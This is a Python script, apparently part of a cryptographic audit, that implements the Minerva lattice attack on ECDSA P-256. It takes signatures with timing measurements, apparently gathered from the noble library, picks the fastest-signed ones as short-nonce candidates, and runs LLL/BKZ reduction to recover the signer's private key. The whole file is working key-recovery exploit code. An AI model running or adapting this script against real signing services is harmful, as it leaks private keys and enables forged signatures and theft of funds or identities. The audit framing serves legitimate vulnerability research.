#!/usr/bin/env python3
# Per-signature-hash Minerva/HGS lattice, ported from audit/minerva/poc/attack/attack.py `Solver`.
# Handles distinct messages per signature (unlike attack.py's single-message assumption), so it works
# on the CSVs emitted by minerva_3p.mjs / the noble collectors.
#
# Input CSV: header "<pubkey_hex> <privkey_hex>", then rows "<elapsed>,<h_hex>,<r_hex>,<s_hex>,<bitlen>".
#   mode "oracle" sorts by TRUE nonce bit-length (upper bound: are these sigs attackable at all?);
#   mode "timing" sorts by the measured timing (the real attack). `cap` caps the per-row
#   known-leading-zero bound (0 = naive geom_bound).
#
# Requires audit/minerva/ (clone https://github.com/crocs-muni/minerva there) and `fpylll`.
# Usage: python3 minerva_lattice.py <sigs.csv> [dim=90] [mode=timing|oracle] [cap=0]
import os, sys, time
_HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.join(_HERE, "..", "..", "audit", "minerva", "poc", "attack"))
from ec import get_curve, Mod
from fpylll import LLL, BKZ, IntegerMatrix

curve = get_curve("secp256r1")   # noble p256 == NIST P-256 == secp256r1
n = curve.group.n
G = curve.g

fname, dim = sys.argv[1], int(sys.argv[2]) if len(sys.argv) > 2 else 90
mode = sys.argv[3] if len(sys.argv) > 3 else "timing"
cap = int(sys.argv[4]) if len(sys.argv) > 4 else 0
betas = [None, 15, 20, 30, 40, 45, 50, 55]

with open(fname) as f:
    header = f.readline().split()
    priv_true = int(header[1], 16)
    pub = curve.decode_point(bytes.fromhex(header[0]))
    sigs = []  # (sortkey, t, u)
    for line in f:
        e, h, r, s, bl = line.strip().split(",")
        h = Mod(int(h, 16), n); r = Mod(int(r, 16), n); s = Mod(int(s, 16), n)
        sinv = s.inverse()
        t = int(sinv * r); u = int(-sinv * h)               # HNP: k = t*d + u (mod n)
        key = int(bl) if mode == "oracle" else int(e)       # oracle: sort by TRUE bit-length
        sigs.append((key, t, u))

total = len(sigs)
print(f"[*] mode = {mode}  ({'sort by TRUE nonce bit-length (perfect oracle)' if mode=='oracle' else 'sort by measured timing'})")
sigs.sort(key=lambda x: x[0])   # ascending => shortest nonces first
sel = sigs[:dim]
print(f"[*] loaded {total} sigs, using fastest {dim} for the lattice")

def geom_bound(index):           # expected leading-zero bits at sorted position `index`
    i = 1
    while total / (2 ** i) >= index + 1:
        i += 1
    i -= 1
    g = 0 if i <= 1 else i
    return min(g, cap) if cap else g

def build(sel):
    d = len(sel)
    b = IntegerMatrix(d + 2, d + 2)
    for i in range(d):
        li = geom_bound(i) + 1
        b[i, i] = (2 ** li) * n
        b[d, i] = (2 ** li) * sel[i][1]           # t
        b[d + 1, i] = (2 ** li) * sel[i][2] + n   # u
    b[d, d] = 1
    b[d + 1, d + 1] = n
    return b

def found(lat):
    for row in lat:
        for guess in (row[-2] % n, (-row[-2]) % n):
            if guess and guess * G == pub:        # cryptographic verification
                print(f"[+] *** FOUND PRIVATE KEY *** {hex(guess)}  (matches header: {guess == priv_true})")
                return True
    return False

info = sum(geom_bound(i) for i in range(len(sel)))
print(f"[*] lattice info = {info} bits (need > {curve.bit_size()})")
lat = build(sel)
t0 = time.time()
for beta in betas:
    lat = LLL.reduction(lat) if beta is None else BKZ.reduction(lat, BKZ.Param(block_size=beta, strategies=BKZ.DEFAULT_STRATEGY, auto_abort=True))
    tag = "LLL" if beta is None else f"BKZ-{beta}"
    if found(lat):
        print(f"    {tag} -> KEY FOUND [{int(time.time()-t0)}s]"); sys.exit(0)
    print(f"    {tag} [{int(time.time()-t0)}s]")
print("[x] key NOT recovered")
sys.exit(1)
